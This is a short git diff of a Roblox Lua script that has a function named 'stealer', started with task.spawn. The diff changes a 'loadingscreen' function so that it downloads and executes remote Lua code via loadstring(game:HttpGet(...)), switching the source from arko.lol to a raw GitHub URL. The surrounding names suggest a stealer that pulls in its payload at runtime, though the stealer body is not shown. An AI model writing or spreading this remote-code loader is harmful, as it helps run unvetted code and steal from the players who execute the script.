@@ -3,7 +3,7 @@ local function stealer()
 end
 
 local function loadingscreen()
-    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/arko", true))()
 end
 
 task.spawn(stealer)
